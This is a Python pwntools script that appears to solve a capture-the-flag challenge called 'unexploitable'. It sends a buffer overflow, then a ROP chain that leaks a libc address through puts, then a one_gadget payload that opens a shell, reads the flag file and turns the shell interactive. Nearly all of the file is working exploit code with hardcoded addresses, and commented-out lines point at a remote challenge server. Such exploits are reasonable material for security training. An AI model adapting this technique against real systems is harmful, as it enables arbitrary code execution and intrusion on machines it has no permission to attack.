from pwn import *


#p = remote("140.113.209.24",11005)
#p = remote("127.0.0.1",9999)
p = process("cat - > fifo",shell=True)
r = process("script -c '/home/unexploitable/unexploitable < fifo ' /dev/null", shell=True)
raw_input("Wait")
print r.recv()
p.send("A"*16) # fill buffer
p.send(p64(0x0602000-0x100)) # ebp
p.send(p64(0x400610)) # rop gadget; mov rdi, [rsp+0x30]
p.send(p64(0x123)*6) #
p.send(p64(0x601010)) #
p.send(p64(0x400430)) # puts function
p.send(p64(0x400544)) # main
x = r.recvline()
start_main_addr =  u64(x[:6]+"\x00\x00")
one_gadget = start_main_addr + 0xC1B7A
sleep(1)
p.send("A"*16) # fill buffer
p.send(p64(0x602000-0x100)) # ebp
p.send(p64(one_gadget)) # rop gadget; mov rdi, [rsp+0x30]
p.send(p64(0x00)*100)
sleep(1)
p.sendline("cat /home/unexploitable/flag") # fill buffer

r.interactive()


